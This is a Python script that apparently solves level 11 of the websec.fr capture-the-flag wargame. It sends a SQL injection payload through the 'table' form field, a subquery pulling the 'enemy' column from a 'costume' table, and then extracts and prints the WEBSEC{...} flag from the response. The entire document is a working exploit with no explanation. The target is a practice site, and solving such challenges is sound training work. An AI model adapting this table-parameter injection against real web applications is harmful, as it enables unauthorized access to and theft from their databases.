from requests import *

url = 'http://websec.fr/level11/index.php'
data = {
    'user_id' : '2',
    'table' : '(select 2 id,enemy username from costume where id like 1)',
    'submit' : 'Submit'
}

r = post(url , data=data)

pos = r.text.find('WEBSEC{')
while (True):
    txt = r.text[pos]
    print(txt , end='')
    if (txt == '}'):
        print()
        break

    pos += 1
